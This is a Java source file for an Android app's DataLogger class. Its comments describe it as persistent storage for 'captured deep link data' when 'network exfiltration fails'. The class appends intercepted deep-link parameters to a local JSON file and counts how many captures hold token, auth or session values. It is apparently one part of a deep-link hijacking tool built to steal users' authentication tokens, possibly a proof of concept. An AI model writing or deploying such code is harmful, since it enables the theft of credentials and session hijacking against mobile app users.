package com.example.deeplink;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Persistent logger for captured deep link data
 * Stores data locally in case network exfiltration fails
 */
public class DataLogger {
    private static final String LOG_FILE = "captured_data.json";
    private static final String TAG = "DataLogger";
    private Context context;

    public DataLogger(Context context) {
        this.context = context;
    }

    /**
     * Log captured data to persistent storage
     */
    public void logCapturedData(JSONObject data) {
        try {
            // Read existing logs
            JSONArray existingLogs = readLogs();
            
            // Add timestamp if not present
            if (!data.has("timestamp")) {
                data.put("timestamp", System.currentTimeMillis());
            }
            
            // Add formatted date
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
            data.put("captured_at", sdf.format(new Date()));
            
            // Append new data
            existingLogs.put(data);
            
            // Write back to file
            writeLogs(existingLogs);
            
            Log.d(TAG, "✅ Data logged persistently (total entries: " + existingLogs.length() + ")");
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to log data persistently", e);
        }
    }

    /**
     * Read all captured logs
     */
    public JSONArray readLogs() {
        try {
            File file = new File(context.getFilesDir(), LOG_FILE);
            
            if (!file.exists()) {
                return new JSONArray();
            }
            
            FileInputStream fis = new FileInputStream(file);
            BufferedReader reader = new BufferedReader(new InputStreamReader(fis));
            StringBuilder sb = new StringBuilder();
            String line;
            
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            
            reader.close();
            fis.close();
            
            return new JSONArray(sb.toString());
            
        } catch (Exception e) {
            Log.e(TAG, "Failed to read logs", e);
            return new JSONArray();
        }
    }

    /**
     * Write logs to file
     */
    private void writeLogs(JSONArray logs) throws Exception {
        File file = new File(context.getFilesDir(), LOG_FILE);
        FileOutputStream fos = new FileOutputStream(file);
        fos.write(logs.toString(2).getBytes());
        fos.close();
    }

    /**
     * Get log file path for debugging
     */
    public String getLogFilePath() {
        return new File(context.getFilesDir(), LOG_FILE).getAbsolutePath();
    }

    /**
     * Clear all logs
     */
    public void clearLogs() {
        File file = new File(context.getFilesDir(), LOG_FILE);
        if (file.exists()) {
            file.delete();
            Log.d(TAG, "Logs cleared");
        }
    }

    /**
     * Get summary statistics
     */
    public JSONObject getStats() {
        JSONObject stats = new JSONObject();
        try {
            JSONArray logs = readLogs();
            stats.put("total_captures", logs.length());
            stats.put("log_file_path", getLogFilePath());
            
            // Count unique tokens
            int tokenCount = 0;
            for (int i = 0; i < logs.length(); i++) {
                JSONObject log = logs.getJSONObject(i);
                if (log.has("parameters")) {
                    JSONObject params = log.getJSONObject("parameters");
                    if (params.has("token") || params.has("auth") || params.has("session")) {
                        tokenCount++;
                    }
                }
            }
            stats.put("captures_with_tokens", tokenCount);
            
        } catch (JSONException e) {
            Log.e(TAG, "Failed to generate stats", e);
        }
        return stats;
    }
}

